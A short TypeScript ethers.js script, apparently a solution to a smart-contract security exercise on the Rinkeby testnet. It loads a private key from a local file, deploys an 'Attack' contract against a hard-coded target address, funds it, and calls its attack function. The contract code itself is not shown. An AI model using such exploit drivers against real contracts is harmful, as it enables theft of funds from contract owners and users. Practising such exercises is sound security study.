import { getDefaultProvider } from '@ethersproject/providers';
import { Wallet, utils } from 'ethers';
import { readFileSync } from 'fs-extra';
import path from 'path/posix';
import { Attack__factory } from '../types/ethers-contracts/factories/Attack__factory';

// import {  } from '../types/ethers-contracts';

// const provider = getDefaultProvider("http://127.0.0.1:8545");
const provider = getDefaultProvider("rinkeby");
const testPrivKey = readFileSync(path.resolve(__dirname, "./../../../.privkey")).toString().trim();
// const testPrivKey = "";
const addr = "0x560a21168a123062Dd77C616a13d1bdf1a34b1A3"

function toWei(eth: number) {
  return utils.parseEther(eth.toString())
}

async function main() {
  let alice = new Wallet(testPrivKey);
  alice = alice.connect(provider);
  (new Attack__factory(alice)).deploy(addr).then(async attack => {
    console.log("deployed.")
    await alice.sendTransaction({
      to: attack.address,
      value: 1000000000000000
    })
    attack.attack().then(() => {
      console.log("done")
    })
  })
}

main().catch(e => {
  console.log("Error: " + e)
})
